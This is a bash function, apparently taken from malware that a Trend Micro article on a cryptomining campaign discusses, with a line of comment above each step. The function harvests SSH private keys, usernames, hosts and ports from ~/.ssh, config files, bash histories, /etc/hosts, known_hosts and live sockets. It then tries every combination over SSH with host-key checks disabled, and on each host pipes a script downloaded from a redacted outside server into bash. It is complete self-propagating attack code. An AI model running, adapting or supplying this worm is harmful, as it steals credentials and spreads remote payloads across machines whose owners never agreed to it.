# https://www.trendmicro.com/en_us/research/24/h/cve-2023-22527-cryptomining.html
scan_ssh_keys_and_spread() {
  echo "localgo start"

  # Get the public IP address of the current machine
  myhostip=$(curl -sL icanhazip.com)

  # Attempt to find SSH private keys in common locations
  KEYS2=$(find ~/.ssh /root /home -maxdepth 3 -name 'id_rsa*' | grep -v pub | awk -F "IdentityFile" '{print $2 }')

  # Extract potential usernames or hostnames from SSH config files
  KEYS3=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config 2>/dev/null | grep -E "(ssh|scp)" | awk -F ' ' '{print $2}' | awk -F '@' '{print $1}')

  # Parse bash history to find arguments used with SSH or SCP
  KEYS4=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history 2>/dev/null | grep -E "(ssh|scp)" | awk -F ' ' '{print $2}')

  # Extract IP addresses from bash history
  KEYS5=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}")

  # Extract hosts from SSH config and bash history
  HOSTS3=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F ' ' '{print $2}' | awk -F '@' '{print $1}')
  HOSTS4=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F ' ' '{print $2}' | awk -F '@' '{print $1}')

  # Extract non-local IPs from /etc/hosts
  HOSTS5=$(cat /etc/hosts | grep -v "0.0.0.0" | grep -v "127.0.0.1" | grep -vw $myhostip | sed -e '/^\n/!s/[0-9.]\+/n&n/;D' | awk '{print $1}')

  # Extract known hosts from known_hosts files
  HOSTS6=$(cat ~/.ssh/known_hosts /home/*/.ssh/known_hosts | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | uniq)

  # Extract IP addresses from active socket connections
  HOSTS7=$(ss auol | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}")

  echo "root"

  # Attempt to identify usernames by looking for id_rsa files and extracting parent directory names
  find /root /home -maxdepth 2 -name "\.ssh" | uniq | xargs find | grep '/id_rsa*' | awk -F '/' '{print $3}' | uniq | grep -vw ".ssh"

  # Extract potential usernames from bash history of SSH commands
  USER2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '@' '{print $1}' | awk '{print $4}' | uniq)

  # Extract ports used with SSH (-p option)
  sshports=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '-p' '{print $2}' | awk '{print $1}' | sed 's/[^0-9]//g' | tr -t ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2- | sed -e 's/^22//')

  # Deduplicate and clean user/host/key lists
  userlist=$(echo "$USER2 $USER2 root" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
  hostlist=$(echo "$HOSTS $HOSTS2 $HOSTS3 $HOSTS4 $HOSTS5 $HOSTS6 $HOSTS7 127.0.0.1" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
  keylist=$(echo "$KEYS $KEYS2 $KEYS3 $KEYS4" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)

  i=0

  # Loop through all combinations of users, hosts, keys, and ports
  for user in $userlist; do
    for host in $hostlist; do
      for key in $keylist; do
        for sshp in $sshports; do
          ((++i))

          # Every 20 attempts, sleep for 5 seconds and kill any stuck SSH processes
          if [[ "${i}" -eq "20" ]]; then
            sleep 5
            ps wx | grep "ssh -o" | awk '{print $1}' | xargs kill -9 &>/dev/null &
            i=0
          fi

          # Set proper permissions for the private key file
          chmod 777 $key
          chmod 400 $key

          # Print the target
          echo "$user@$host"

          # Attempt to connect via SSH and download/execute a remote script
          ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=1 -i $key $user@$host -p $sshp "(curl -s http://[REDACTED]:10000/x |wget -q -O - http://[REDACTED]:10000/x)|bash -sh"
          ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=1 -i $key $user@$host -p $sshp "(curl -s http://[REDACTED]:10000/x |wget -q -O - http://[REDACTED]:10000/x)|bash -sh"
        done
      done
    done
  done
}
